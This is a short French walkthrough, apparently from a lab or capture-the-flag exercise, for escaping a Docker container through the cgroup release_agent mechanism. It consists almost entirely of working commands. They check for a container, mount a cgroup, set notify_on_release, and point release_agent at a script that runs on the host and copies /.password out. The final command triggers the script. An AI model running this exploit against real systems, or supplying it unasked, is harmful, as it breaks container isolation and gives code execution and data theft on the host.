## Vérification de l'environnement Docker

Pour vérifier si vous êtes dans un conteneur Docker, procédez comme suit :

1. **Lister le contenu de la racine `/` :**

   ```bash
   ls -a /
   ```

   **Résultat attendu :**
   ```bash
   .     bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
   ..  .dockerenv  boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
   ```
   La présence du fichier `.dockerenv` indique que vous êtes dans un conteneur Docker.

2. **Afficher les capacités du conteneur :**

   ```bash
   capsh --print
   ```

   **Résultat attendu :**
   ```bash
   cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
   ```

## Préparer l'Environnement

1. **Créer le répertoire pour le cgroup et monter le système de fichiers :**

   ```bash
   mkdir /tmp/cgrp
   mount -t cgroup -o rdma cgroup /tmp/cgrp
   mkdir /tmp/cgrp/x
   ```

2. **Configurer le cgroup enfant :**

   ```bash
   echo 1 > /tmp/cgrp/x/notify_on_release
   ```

3. **Configurer le Release Agent :**

   ```bash
   host_path=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab)
   echo "$host_path/cmd" > /tmp/cgrp/release_agent
   ```

4. **Créer et configurer le script `/cmd` :**

   ```bash
   echo '#!/bin/sh' > /cmd
   echo "cat /.password > $host_path/output" >> /cmd
   chmod a+x /cmd
   ```

## Déclencher l'attaque

Pour déclencher l'attaque et exécuter le script :

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
